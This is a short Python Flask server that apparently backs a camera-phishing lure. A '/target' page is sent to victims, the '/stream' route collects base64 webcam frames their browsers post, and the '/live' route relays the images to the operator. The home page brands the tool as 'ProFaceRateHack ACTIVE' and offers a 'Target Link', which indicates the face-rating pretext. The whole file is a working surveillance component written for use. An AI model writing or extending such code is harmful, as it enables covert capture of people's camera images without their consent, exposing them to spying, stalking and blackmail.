from flask import Flask, render_template, request, Response
import base64
import cv2
import numpy as np
import threading
import time

app = Flask(__name__, static_folder='../static', template_folder='../templates')

latest_frame = None
lock = threading.Lock()

@app.route('/target')
def target():
    return render_template('index.html')

@app.route('/stream', methods=['POST'])
def stream():
    global latest_frame
    try:
        img_b64 = request.json['image'].split(',')[1]
        img_data = base64.b64decode(img_b64)
        nparr = np.frombuffer(img_data, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if frame is not None:
            frame = cv2.resize(frame, (640, 480))
            with lock:
                latest_frame = frame.copy()
    except: pass
    return {"status": "live"}

@app.route('/live')
def live():
    def gen():
        while True:
            with lock:
                if latest_frame is not None:
                    _, buf = cv2.imencode('.jpg', latest_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
                    yield f"data: {base64.b64encode(buf).decode()}\n\n"
            time.sleep(0.1)
    return Response(gen(), mimetype='text/event-stream')

@app.route('/')
def home():
    return "<h2>ProFaceRateHack ACTIVE</h2><a href='/target'>Target Link</a>"

if __name__ == '__main__':
    app.run()
